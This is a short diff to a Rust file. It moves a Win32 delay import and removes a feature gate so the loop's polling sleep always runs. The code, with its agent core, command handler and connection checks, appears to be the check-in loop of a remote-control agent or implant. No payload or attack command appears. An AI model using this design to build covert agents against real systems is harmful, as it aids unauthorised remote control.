@@ -1,8 +1,6 @@
 use libc_print::libc_println;
-use mod_win32::nt_time::delay;
 
 extern crate alloc;
-
 use alloc::sync::Arc;
 
 pub mod command;
@@ -26,6 +24,7 @@ use mod_agentcore::instance;
 #[cfg(feature = "std-runtime")]
 use mod_std_runtime::CustomRuntime;
 
+use mod_win32::nt_time::delay;
 use rs2_runtime::Runtime;
 
 /// Main routine that initializes the runtime and repeatedly checks the connection status.
@@ -45,14 +44,11 @@ pub fn routine() {
                 command_handler(rt.clone());
             }
 
-            #[cfg(feature = "std-runtime")]
-            {
-                // Sleep for 15 seconds before checking again, ensuring all tasks are done.
-                libc_println!("Sleep: {}", instance().config.polling_interval);
-                rt.block_on(async {
-                    delay(instance().config.polling_interval);
-                });
-            }
+            // Sleep for 15 seconds before checking again, ensuring all tasks are done.
+            libc_println!("Sleep: {}", instance().config.polling_interval);
+            rt.block_on(async {
+                delay(instance().config.polling_interval);
+            });
         }
     }
 }
